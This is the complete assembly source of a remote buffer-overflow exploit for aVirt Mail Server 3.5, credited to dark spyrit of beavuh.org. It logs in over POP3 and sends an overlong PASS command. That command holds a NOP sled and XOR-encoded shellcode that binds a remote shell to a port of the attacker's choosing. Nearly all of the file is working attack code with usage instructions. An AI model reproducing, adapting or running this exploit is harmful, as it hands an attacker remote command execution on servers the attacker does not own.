; The binary is available at http://www.beavuh.org.
;
; To assemble:
;
; tasm32 -ml avirtx.asm
; tlink32 -Tpe -c -x avirtx.obj ,,, import32
;
; TASM 5 required!
;
; dark spyrit  <dspyrit@beavuh.org>


.386p
locals
jumps
.model flat, stdcall


extrn GetCommandLineA:PROC
extrn GetStdHandle:PROC
extrn WriteConsoleA:PROC
extrn ExitProcess:PROC
extrn WSAStartup:PROC
extrn connect:PROC
extrn send:PROC
extrn recv:PROC
extrn WSACleanup:PROC
extrn gethostbyname:PROC
extrn htons:PROC
extrn socket:PROC
extrn inet_addr:PROC
extrn closesocket:PROC

.data
sploit_length           equ     783

sploit:
 db "PASS " 
 db 016h, 05bh, 05bh, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h, 090h
 db 090h, 090h, 090h, 090h, 090h, 08bh, 0feh, 033h, 0c0h, 050h, 0f7h, 0d0h
 db 050h, 059h, 0f2h, 0afh, 059h, 0b1h, 0c6h, 08bh, 0c7h, 048h, 080h, 030h
 db 099h, 0e2h, 0fah, 033h, 0f6h, 096h, 0bbh, 099h, 0b0h, 090h, 041h, 0c1h
 db 0ebh, 008h, 056h, 0ffh, 013h, 08bh, 0d0h, 0fch, 033h, 0c9h, 0b1h, 00bh
 db 049h, 032h, 0c0h, 0ach, 084h, 0c0h, 075h, 0f9h, 052h, 051h, 056h, 052h
 db 0b3h, 08ch, 0ffh, 013h, 0abh, 059h, 05ah, 0e2h, 0ech, 032h, 0c0h, 0ach
 db 084h, 0c0h, 075h, 0f9h, 0b3h, 0b0h, 056h, 0ffh, 013h, 08bh, 0d0h, 0fch
 db 033h, 0c9h, 0b1h, 006h, 032h, 0c0h, 0ach, 084h, 0c0h, 075h, 0f9h, 052h
 db 051h, 056h, 052h, 0b3h, 08ch, 0ffh, 013h, 0abh, 059h, 05ah, 0e2h, 0ech
 db 083h, 0c6h, 005h, 033h, 0c0h, 050h, 040h, 050h, 040h, 050h, 0ffh, 057h
 db 0e8h, 093h, 06ah, 010h, 056h, 053h, 0ffh, 057h, 0ech, 06ah, 002h, 053h
 db 0ffh, 057h, 0f0h, 033h, 0c0h, 057h, 050h, 0b0h, 00ch, 0abh, 058h, 0abh
 db 040h, 0abh, 05fh, 048h, 050h, 057h, 056h, 0adh, 056h, 0ffh, 057h, 0c0h
 db 048h, 050h, 057h, 0adh, 056h, 0adh, 056h, 0ffh, 057h, 0c0h, 048h, 0b0h
 db 044h, 089h, 007h, 057h, 0ffh, 057h, 0c4h, 033h, 0c0h, 08bh, 046h, 0f4h
 db 089h, 047h, 03ch, 089h, 047h, 040h, 08bh, 006h, 089h, 047h, 038h, 033h
 db 0c0h, 066h, 0b8h, 001h, 001h, 089h, 047h, 02ch, 057h, 057h, 033h, 0c0h
 db 050h, 050h, 050h, 040h, 050h, 048h, 050h, 050h, 0adh, 056h, 033h, 0c0h
 db 050h, 0ffh, 057h, 0c8h, 0ffh, 076h, 0f0h, 0ffh, 057h, 0cch, 0ffh, 076h
 db 0fch, 0ffh, 057h, 0cch, 048h, 050h, 050h, 053h, 0ffh, 057h, 0f4h, 08bh
 db 0d8h, 033h, 0c0h, 0b4h, 004h, 050h, 0c1h, 0e8h, 004h, 050h, 0ffh, 057h
 db 0d4h, 08bh, 0f0h, 033h, 0c0h, 08bh, 0c8h, 0b5h, 004h, 050h, 050h, 057h
 db 051h, 050h, 0ffh, 077h, 0a8h, 0ffh, 057h, 0d0h, 083h, 03fh, 001h, 07ch
 db 022h, 033h, 0c0h, 050h, 057h, 0ffh, 037h, 056h, 0ffh, 077h, 0a8h, 0ffh
 db 057h, 0dch, 00bh, 0c0h, 074h, 02fh, 033h, 0c0h, 050h, 0ffh, 037h, 056h
 db 053h, 0ffh, 057h, 0f8h, 06ah, 050h, 0ffh, 057h, 0e0h, 0ebh, 0c8h, 033h
 db 0c0h, 050h, 0b4h, 004h, 050h, 056h, 053h, 0ffh, 057h, 0fch, 057h, 033h
 db 0c9h, 051h, 050h, 056h, 0ffh, 077h, 0ach, 0ffh, 057h, 0d8h, 06ah, 050h
 db 0ffh, 057h, 0e0h, 0ebh, 0aah, 050h, 0ffh, 057h, 0e4h, 090h, 0d2h, 0dch
 db 0cbh, 0d7h, 0dch, 0d5h, 0aah, 0abh, 099h, 0dah, 0ebh, 0fch, 0f8h, 0edh
 db 0fch, 0c9h, 0f0h, 0e9h, 0fch, 099h, 0deh, 0fch, 0edh, 0cah, 0edh, 0f8h
 db 0ebh, 0edh, 0ech, 0e9h, 0d0h, 0f7h, 0ffh, 0f6h, 0d8h, 099h, 0dah, 0ebh
 db 0fch, 0f8h, 0edh, 0fch, 0c9h, 0ebh, 0f6h, 0fah, 0fch, 0eah, 0eah, 0d8h
 db 099h, 0dah, 0f5h, 0f6h, 0eah, 0fch, 0d1h, 0f8h, 0f7h, 0fdh, 0f5h, 0fch
 db 099h, 0c9h, 0fch, 0fch, 0f2h, 0d7h, 0f8h, 0f4h, 0fch, 0fdh, 0c9h, 0f0h
 db 0e9h, 0fch, 099h, 0deh, 0f5h, 0f6h, 0fbh, 0f8h, 0f5h, 0d8h, 0f5h, 0f5h
 db 0f6h, 0fah, 099h, 0ceh, 0ebh, 0f0h, 0edh, 0fch, 0dfh, 0f0h, 0f5h, 0fch
 db 099h, 0cbh, 0fch, 0f8h, 0fdh, 0dfh, 0f0h, 0f5h, 0fch, 099h, 0cah, 0f5h
 db 0fch, 0fch, 0e9h, 099h, 0dch, 0e1h, 0f0h, 0edh, 0c9h, 0ebh, 0f6h, 0fah
 db 0fch, 0eah, 0eah, 099h, 0ceh, 0cah, 0d6h, 0dah, 0d2h, 0aah, 0abh, 099h
 db 0eah, 0f6h, 0fah, 0f2h, 0fch, 0edh, 099h, 0fbh, 0f0h, 0f7h, 0fdh, 099h
 db 0f5h, 0f0h, 0eah, 0edh, 0fch, 0f7h, 099h, 0f8h, 0fah, 0fah, 0fch, 0e9h
 db 0edh, 099h, 0eah, 0fch, 0f7h, 0fdh, 099h, 0ebh, 0fch, 0fah, 0efh, 099h
 db 09bh, 099h
 store dw ? 
 db 099h, 099h, 099h, 099h, 099h, 099h, 099h, 099h
 db 099h, 099h, 099h, 099h, 0fah, 0f4h, 0fdh, 0b7h, 0fch, 0e1h, 0fch, 099h
 db 0ffh, 0ffh, 0ffh, 0ffh, 090h, 090h, 090h, 090h, 090h, 05fh, 029h, 040h
 db 000h, 00dh, 00ah  

user db "user beavuh",0dh,0ah,0
userl equ $-user
logo  db "aVirt Mail Server 3.5 remote.", 13, 10
      db "by dark spyrit <dspyrit@beavuh.org>",13,10
      db "http://www.beavuh.org",13,10,13,10
      db "usage: avirtx <host> <port> <port to bind shell>", 13, 10
      db "eg - avirtx host.com 110 1234",13,10,0
      logolen equ $-logo


errorinit db 10,"error initializing winsock.", 13, 10, 0
errorinitl equ $-errorinit

derror  db 10,"error.",13,10,0
derrorl equ $-derror

nohost db 10,"no host or ip specified.", 13,10,0
nohostl equ $-nohost

noport db 10,"no port specified.",13,10,0
noportl equ $-noport

no_port2 db 10,"no bind port specified.",13,10,0
no_port2l equ $-no_port2

response db 10,"waiting for response....",13,10,0
respl   equ $-response

reshost db 10,"error resolving host.",13,10,0
reshostl equ $-reshost

sockerr db 10,"error creating socket.",13,10,0
sockerrl equ $-sockerr

ipill   db 10,"ip error.",13,10,0
ipilll   equ $-ipill

cnerror db 10,"error establishing connection.",13,10,0
cnerrorl equ $-cnerror

success db 10,"sent.. spawn connection now.",13,10,0
successl equ $-success

console_in      dd      ?
console_out     dd      ?
bytes_read      dd      ?

wsadescription_len equ 256
wsasys_status_len equ 128

WSAdata struct
wVersion dw ?
wHighVersion dw ?
szDescription db wsadescription_len+1 dup (?)
szSystemStatus db wsasys_status_len+1 dup (?)
iMaxSockets dw ?
iMaxUdpDg dw ?
lpVendorInfo dw ?
WSAdata ends

sockaddr_in struct
sin_family dw ?
sin_port dw ?
sin_addr dd ?
sin_zero db 8 dup (0)
sockaddr_in ends

wsadata WSAdata <?>
sin sockaddr_in <?>
sock dd ?
numbase dd 10
_port db 256 dup (?)
_host db 256 dup (?)
_port2 db 256 dup (?)
buffer db 1000 dup (0)

.code
start:

        call    init_console
        push    logolen
        push    offset logo
        call    write_console

        call    GetCommandLineA
        mov     edi, eax
        mov     ecx, -1
        xor     al, al
        push    edi
        repnz   scasb
        not     ecx
        pop     edi
        mov     al, 20h
        repnz   scasb
        dec     ecx
        cmp     ch, 0ffh
        jz      @@0
        test    ecx, ecx
        jnz     @@1
@@0:        
        push    nohostl
        push    offset nohost
        call    write_console
        jmp     quit3
@@1:
        mov     esi, edi
        lea     edi, _host
        call    parse
        or      ecx, ecx
        jnz     @@2
        push    noportl
        push    offset noport
        call    write_console
        jmp     quit3
@@2:
        lea     edi, _port
        call    parse
        or      ecx, ecx
        jnz     @@3
        push    no_port2l
        push    offset no_port2
        call    write_console
        jmp     quit3

@@3:
        push    ecx
        lea     edi, _port2
        call    parse

        push    offset wsadata
        push    0101h
        call    WSAStartup
        or      eax, eax
        jz      winsock_found

        push    errorinitl
        push    offset errorinit
        call    write_console
        jmp     quit3

winsock_found:
        xor     eax, eax
        push    eax
        inc     eax
        push    eax
        inc     eax
        push    eax
        call    socket
        cmp     eax, -1
        jnz     socket_ok

        push    sockerrl
        push    offset sockerr
        call    write_console
        jmp     quit2

socket_ok:
        mov     sock, eax
        mov     sin.sin_family, 2
        
        mov     ebx, offset _port
        call    str2num
        mov     eax, edx
        push    eax
        call    htons
        mov     sin.sin_port, ax
        
        mov     ebx, offset _port2
        call    str2num
        mov     eax, edx
        push    eax
        call    htons
        xor     ax, 09999h
        mov     store, ax

        mov     esi, offset _host
lewp:
        xor     al, al
        lodsb
        cmp     al, 039h
        ja      gethost
        test    al, al
        jnz     lewp
        push    offset _host
        call    inet_addr
        cmp     eax, -1
        jnz     ip_aight
        push    ipilll
        push    offset ipill
        call    write_console
        jmp     quit1

ip_aight:
        mov     sin.sin_addr, eax
        jmp     continue

gethost:
        push    offset _host
        call    gethostbyname
        test    eax, eax
        jnz     gothost

        push    reshostl
        push    offset reshost
        call    write_console
        jmp     quit1

gothost:
        mov     eax, [eax+0ch]
        mov     eax, [eax]
        mov     eax, [eax]
        mov     sin.sin_addr, eax

continue:
        push    size sin
        push    offset sin
        push    sock
        call    connect
        or      eax, eax
        jz      connect_ok
        push    cnerrorl
        push    offset cnerror
        call    write_console
        jmp     quit1

connect_ok:
        push    respl
        push    offset response
        call    write_console
        
        xor     eax, eax
        push    eax
        push    1000
        push    offset buffer
        push    sock
        call    recv
        or      eax, eax
        jg      sveet

        push    derrorl        
        push    offset derror
        call    write_console
        jmp     quit1

sveet:        
        push    eax
        push    offset buffer
        call    write_console
        
        xor     eax, eax
        push    eax
        push    userl
        push    offset user
        push    sock
        call    send
        
        xor     eax, eax
        push    eax
        push    1000
        push    offset buffer
        push    sock
        call    recv
        or      eax, eax
        jg      sveet1
        
        push    derrorl        
        push    offset derror
        call    write_console
        jmp     quit1
sveet1:        
        push    eax
        push    offset buffer
        call    write_console

        xor     eax, eax
        push    eax
        push    sploit_length
        push    offset sploit
        push    sock
        call    send
        push    successl
        push    offset success
        call    write_console

quit1:
        push    sock
        call    closesocket
quit2:
        call    WSACleanup
quit3:
        push    0
        call    ExitProcess
parse   proc
;cheap parsing.. 
lewp9:
        xor     eax, eax
        cld
        lodsb
        cmp     al, 20h
        jz      done
        test    al, al
        jz      done2
        stosb
        dec     ecx
        jmp     lewp9
done:
        dec     ecx
done2:
        ret
endp

str2num proc
        push    eax ecx edi
        xor     eax, eax
        xor     ecx, ecx
        xor     edx, edx
        xor     edi, edi
lewp2:
        xor     al, al
        xlat
        test    al, al
        jz      end_it
        sub     al, 030h
        mov     cl, al
        mov     eax, edx
        mul     numbase
        add     eax, ecx
        mov     edx, eax
        inc     ebx
        inc     edi
        cmp     edi, 0ah
        jnz     lewp2

end_it:
        pop     edi ecx eax
        ret
endp

init_console  proc
        push    -10
        call    GetStdHandle
        or      eax, eax
        je      init_error
        mov     [console_in], eax
        push    -11
        call    GetStdHandle
        or      eax, eax
        je      init_error
        mov     [console_out], eax
        ret
init_error:
        push    0
        call    ExitProcess
endp

write_console proc    text_out:dword, text_len:dword
        pusha
        push    0
        push    offset bytes_read 
        push    text_len          
        push    text_out          
        push    console_out       
        call    WriteConsoleA
        popa
        ret
endp

end     start


